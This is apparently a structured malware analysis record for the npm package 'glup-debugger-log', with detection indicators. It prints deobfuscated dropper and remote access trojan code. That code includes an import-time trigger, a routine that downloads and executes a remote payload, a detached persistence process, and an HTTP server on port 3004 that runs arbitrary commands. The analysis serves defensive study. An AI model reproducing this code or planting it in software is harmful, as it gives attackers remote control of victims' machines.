@@ -1,0 +1,185 @@
+{
+  "package_info": {
+    "package_name": "glup-debugger-log",
+    "package_manager": "npm",
+    "package_versions": "0.0.3",
+    "why_malicious": "The package contains obfuscated JavaScript code that acts as a dropper and remote access trojan (RAT). It performs environment checks to target specific systems, downloads and executes additional payloads, and establishes a persistent HTTP server for arbitrary remote code execution, all without user consent."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "test (npm test) / import-time",
+        "file_location": "index.js",
+        "required_permissions": [
+          "filesystem",
+          "module_loading"
+        ]
+      },
+      "code_snippet": "var localLogger = require(\"./lib/play\");\nlocalLogger.bind();",
+      "code_language": "javascript",
+      "code_behavior": "At import-time or when npm test is run, the code loads and immediately executes the bind() function from the obfuscated play.js file, triggering the malware dropper logic.",
+      "malice_analysis": {
+        "why_suspicious": "Directly executing a local, obfuscated module during test or import is highly unusual and a common malware entry point.",
+        "violated_expectations": "Legitimate packages do not execute obfuscated code or side-effectful logic on import or test.",
+        "similar_legitimate_use": "Some test scripts may run setup code, but not obfuscated or hidden logic.",
+        "key_indicators": [
+          "Immediate execution of obfuscated local module",
+          "Non-standard use of test script for code execution"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (via bind)",
+        "file_location": "lib/play.js (deobfuscated)",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "os",
+          "child_process"
+        ]
+      },
+      "code_snippet": "function bind() {\n  let randomNumber = null;\n  for (let i = 0; i < Math.floor(Math.random() * 1000); i++) {\n    randomNumber = i + 2;\n  }\n  (function () {})(randomNumber);\n  new Promise(() => {\n    start();\n    share();\n  });\n}\nexports.bind = bind;",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, the bind() function asynchronously triggers start() (the dropper logic) and share() (the persistence mechanism), setting up the malware deployment chain.",
+      "malice_analysis": {
+        "why_suspicious": "The function's only purpose is to launch further malicious routines, with obfuscation and unnecessary randomization to hinder analysis.",
+        "violated_expectations": "Normal utility functions do not launch hidden, asynchronous malware routines.",
+        "key_indicators": [
+          "Obfuscated, non-functional code (random number loop)",
+          "Asynchronous launch of multiple suspicious routines"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (via bind > start)",
+        "file_location": "lib/play.js (deobfuscated)",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "os",
+          "child_process"
+        ]
+      },
+      "code_snippet": "function start() {\n  const config = getConfig();\n  checkEnv(config).then(() => {\n    if (config.p === null) { return; }\n    let { p: command, pv: version, fdp: forceDownloadAndExecute } = config;\n    let shouldExecuteLocally = forceDownloadAndExecute !== true && fs.existsSync(EXECUTABLE_PATH);\n    if (shouldExecuteLocally) {\n      executeCommand(command, version);\n      return;\n    }\n    if (forceDownloadAndExecute !== true && fs.existsSync(LOCK_FILE_PATH)) {\n      return;\n    }\n    let isValidUrl = false;\n    try { new URL(command); isValidUrl = true; } catch (err) {}\n    if (!isValidUrl) {\n      executeCommand(command, version);\n    } else {\n      http.get(command, {}, response => {\n        if (response.statusCode === 200) {\n          response.on('end', () => {\n            response.closed();\n            executeCommand(EXECUTABLE_PATH, version);\n          });\n          response.pipe(fs.createWriteStream(EXECUTABLE_PATH));\n        }\n      });\n    }\n  }).catch(err => { console.error(err); });\n}",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, after passing environment checks, the code either executes a local command or downloads and executes a remote payload, enabling arbitrary code execution or malware delivery.",
+      "malice_analysis": {
+        "why_suspicious": "Conditional execution of local or remote code based on environment checks is a classic dropper technique.",
+        "violated_expectations": "Legitimate packages do not download or execute arbitrary code based on hidden configuration.",
+        "key_indicators": [
+          "Environment-based execution gating",
+          "Remote payload download and execution",
+          "Obfuscated command execution"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_4",
+      "execution_context": {
+        "trigger": "runtime (via bind > share)",
+        "file_location": "lib/play.js (deobfuscated)",
+        "required_permissions": [
+          "filesystem",
+          "child_process"
+        ]
+      },
+      "code_snippet": "function share() {\n  const shareScriptPath = path.join(__dirname, \"play-share.js\");\n  if (fs.existsSync(shareScriptPath)) {\n    childProcess.spawn(\"node\", [shareScriptPath], {\n      'detached': true,\n      'stdio': \"ignore\"\n    }).unref();\n  }\n}",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, the code launches play-share.js as a detached background process, establishing persistence for the RAT component.",
+      "malice_analysis": {
+        "why_suspicious": "Launching a hidden, detached process is a common persistence and stealth technique.",
+        "violated_expectations": "Legitimate packages do not spawn hidden background processes without user knowledge.",
+        "key_indicators": [
+          "Detached process launch",
+          "Persistence mechanism for secondary payload"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_5",
+      "execution_context": {
+        "trigger": "runtime (via play-share.js)",
+        "file_location": "lib/play-share.js (deobfuscated)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "child_process",
+          "os"
+        ]
+      },
+      "code_snippet": "http.createServer({ 'requestTimeout': 60000 }, (request, response) => {\n  response.writeHead(200, { 'Content-Type': 'text/plain;charset=UTF-8' });\n  let command = url.parse(request.url, true).query.cmd;\n  if (command) {\n    try {\n      childProcess.exec(Buffer.from(\"Y2hjcCA2NTAwMQ==\", \"base64\").toString() + \" & \" + command, {\n        'encoding': \"buffer\",\n        'windowsHide': true\n      }, (error, stdout, stderr) => {\n        if (error) {\n          response.end(\"ERR:\\n\" + error.message);\n        } else {\n          if (stdout) {\n            response.end('' + iconv.decode(stdout, \"gbk\"));\n          } else if (stderr) {\n            response.end(\"ERR:\\n\" + iconv.decode(stderr, \"gbk\"));\n          }\n        }\n      });\n    } catch (error) {\n      response.end(\"ERR:\\n\" + error);\n    }\n  }\n}).listen(3004);",
+      "code_language": "javascript",
+      "code_behavior": "At runtime, the code starts an HTTP server on port 3004 that executes arbitrary system commands received via the 'cmd' query parameter, returning the output to the remote attacker.",
+      "malice_analysis": {
+        "why_suspicious": "Setting up a local HTTP server for unauthenticated remote code execution is a hallmark of RATs and backdoors.",
+        "violated_expectations": "Legitimate packages do not expose arbitrary command execution over HTTP.",
+        "key_indicators": [
+          "HTTP server on non-standard port",
+          "Command execution via query parameter",
+          "No authentication or access control"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Malicious code is executed via npm test or import, triggering the bind() function.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Initial dropper logic is launched."
+    },
+    {
+      "step": 2,
+      "action": "Dropper performs environment checks and conditionally executes or downloads further payloads.",
+      "implemented_by": [
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Malware is deployed and/or additional payloads are executed."
+    },
+    {
+      "step": 3,
+      "action": "Persistence is established by launching play-share.js as a detached process.",
+      "implemented_by": [
+        "snippet_4"
+      ],
+      "leads_to": "RAT component is activated."
+    },
+    {
+      "step": 4,
+      "action": "RAT HTTP server is started, allowing remote attackers to execute arbitrary commands.",
+      "implemented_by": [
+        "snippet_5"
+      ],
+      "leads_to": "Attacker gains persistent remote access and control."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Obfuscated JavaScript files executed during install/test/import",
+      "Detached background process spawning secondary scripts",
+      "HTTP server listening on non-standard port (e.g., 3004) for command execution",
+      "Environment checks targeting Windows and active user environments",
+      "Remote payload download and execution"
+    ],
+    "file_indicators": [
+      "lib/play.js (obfuscated, high entropy)",
+      "lib/play-share.js (obfuscated, high entropy)",
+      "node.compress.exe",
+      "node.compress.lock.log",
+      "Batch files with random names in temp directories"
+    ],
+    "network_indicators": [
+      "HTTP server listening on port 3004",
+      "Outbound HTTP GET requests to attacker-controlled URLs for payload download"
+    ],
+    "how_to_detect": "Monitor for obfuscated JavaScript files being executed during npm install, test, or import. Flag packages that spawn detached Node.js processes or create local HTTP servers on non-standard ports. Detect creation of suspicious files such as node.compress.exe and lock files. Watch for outbound HTTP requests to unknown domains and local servers listening for command parameters. Use static analysis to identify high-entropy, obfuscated code and dynamic analysis to observe process spawning and network activity."
+  }
+}
